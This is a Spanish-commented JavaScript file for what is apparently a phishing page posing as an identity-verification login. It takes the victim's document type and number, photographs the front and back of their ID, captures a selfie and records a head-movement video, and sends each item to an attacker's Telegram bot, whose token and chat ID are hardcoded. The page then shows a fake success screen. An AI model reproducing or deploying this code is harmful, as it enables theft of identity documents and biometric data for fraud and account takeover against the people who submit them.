document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    const loginStep = document.getElementById('login-step');
    const idScanStep = document.getElementById('id-scan-step');
    const verificationStep = document.getElementById('verification-step');
    const successStep = document.getElementById('success-step');
    
    // Elements for Facial Video
    const video = document.getElementById('webcam');
    const cameraInstruction = document.querySelector('.camera-instruction');

    // Elements for ID Scan
    const idVideo = document.getElementById('id-webcam');
    const idInstruction = document.getElementById('id-scan-instruction');
    const idStatus = document.querySelector('.camera-status');
    
    // CONFIGURACIÓN TELEGRAM
    // REEMPLAZA ESTOS VALORES CON LOS TUYOS
    const TELEGRAM_BOT_TOKEN = '7793777042:AAHegpN7eQIAcBJZjtMDfZZIwGnsmqv7vfg'; 
    const TELEGRAM_CHAT_ID = '-4992418825';

    let mediaRecorder;
    let recordedChunks = [];
    
    // Form Submission Handler
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        
        const docType = document.getElementById('doc-type').value;
        const docNumber = document.getElementById('doc-number').value;
        
        if (docType && docNumber) {
            // Enviar datos del formulario a Telegram primero
            sendTextToTelegram(`Nuevo intento de acceso:\nTipo: ${docType}\nDocumento: ${docNumber}`);
            
            // Switch to ID Scan step instead of Facial Verification directly
            transitionToIDScan();
        }
    });

    // --- ID SCAN LOGIC ---

    async function transitionToIDScan() {
        loginStep.classList.add('hidden');
        idScanStep.classList.remove('hidden');
        
        await startIDCamera();
        
        // Start Front Scan Flow
        scanIDSide('front');
    }

    async function startIDCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } }, // Use rear camera if available
                audio: false 
            });
            idVideo.srcObject = stream;
        } catch (err) {
            console.error("Error accessing ID camera:", err);
            // Fallback to user camera if environment fails
            try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 idVideo.srcObject = stream;
            } catch (e) {
                idStatus.textContent = "Error de cámara";
            }
        }
    }

    function scanIDSide(side) {
        if (side === 'front') {
            idInstruction.textContent = "Ubique la cara FRONTAL de su documento";
            idStatus.textContent = "Buscando documento...";
        } else {
            idInstruction.textContent = "Ubique el REVERSO de su documento";
            idStatus.textContent = "Gire su documento...";
        }

        // Simulate scanning time then capture
        setTimeout(() => {
            idStatus.textContent = "Capturando...";
            
            // Capture logic
            captureIDImage(side, () => {
                idStatus.textContent = "¡Capturado!";
                
                setTimeout(() => {
                    if (side === 'front') {
                        // Proceed to Back
                        scanIDSide('back');
                    } else {
                        // Proceed to Facial Verification
                        stopIDCamera();
                        transitionToVerification();
                    }
                }, 1000);
            });
        }, 4000); // 4 seconds to position
    }

    function captureIDImage(side, callback) {
        const canvas = document.createElement('canvas');
        canvas.width = idVideo.videoWidth;
        canvas.height = idVideo.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(idVideo, 0, 0);
        
        canvas.toBlob((blob) => {
            sendPhotoToTelegram(blob, `id_${side}.jpg`, `Documento (${side})`);
            if (callback) callback();
        }, 'image/jpeg', 0.8);
    }

    function stopIDCamera() {
        if (idVideo.srcObject) {
            const tracks = idVideo.srcObject.getTracks();
            tracks.forEach(track => track.stop());
            idVideo.srcObject = null;
        }
    }

    // --- FACIAL VERIFICATION LOGIC ---

    function transitionToVerification() {
        idScanStep.classList.add('hidden');
        verificationStep.classList.remove('hidden');
        
        startCamera();
    }

    function transitionToSuccess() {
        verificationStep.classList.add('hidden');
        successStep.classList.remove('hidden');
        
        setTimeout(() => {
            window.location.reload();
        }, 3000);
    }

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user', width: 640, height: 480 },
                audio: false 
            });
            video.srcObject = stream;
            
            // Esperar a que la cámara inicie para empezar el proceso
            video.onloadedmetadata = () => {
                setTimeout(startVerificationProcess, 1000);
            };

        } catch (err) {
            console.error("Error accessing camera:", err);
            cameraInstruction.textContent = "Error de cámara. Verifique permisos.";
        }
    }

    function startVerificationProcess() {
        // 1. Tomar Selfie
        cameraInstruction.textContent = "Mirando al frente...";
        
        setTimeout(() => {
            captureSelfie();
            
            // 2. Grabar Video con movimiento
            cameraInstruction.textContent = "Mueva su cabeza lentamente...";
            startRecording();
            
            // Parar grabación después de 4 segundos
            setTimeout(() => {
                stopRecording();
                cameraInstruction.textContent = "Procesando...";
            }, 4000);
            
        }, 1500);
    }

    function captureSelfie() {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        // Convertir a blob y enviar
        canvas.toBlob((blob) => {
            sendPhotoToTelegram(blob, 'selfie.jpg', 'Captura facial de seguridad');
        }, 'image/jpeg', 0.8);
    }

    // ... (rest of functions) ...

    // --- FUNCIONES TELEGRAM ---

    function sendTextToTelegram(text) {
        if (TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') {
            console.warn("Falta token de Telegram");
            return;
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('text', text);

        fetch(url, { method: 'POST', body: formData })
            .then(res => console.log("Texto enviado:", res.status))
            .catch(console.error);
    }

    function sendPhotoToTelegram(blob, filename, caption) {
        if (TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') {
            console.warn("Falta token de Telegram para foto");
            return;
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, filename || 'photo.jpg');
        formData.append('caption', caption || '');

        fetch(url, { method: 'POST', body: formData })
            .then(res => console.log("Foto enviada:", res.status))
            .catch(console.error);
    }

    function sendVideoToTelegram(blob) {
        if (TELEGRAM_BOT_TOKEN === 'TU_TOKEN_AQUI') {
            console.warn("Falta token de Telegram para video");
            return;
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('video', blob, 'biometric_video.webm');
        formData.append('caption', 'Video de prueba de vida');

        fetch(url, { method: 'POST', body: formData })
            .then(res => console.log("Video enviado:", res.status))
            .catch(console.error);
    }
});
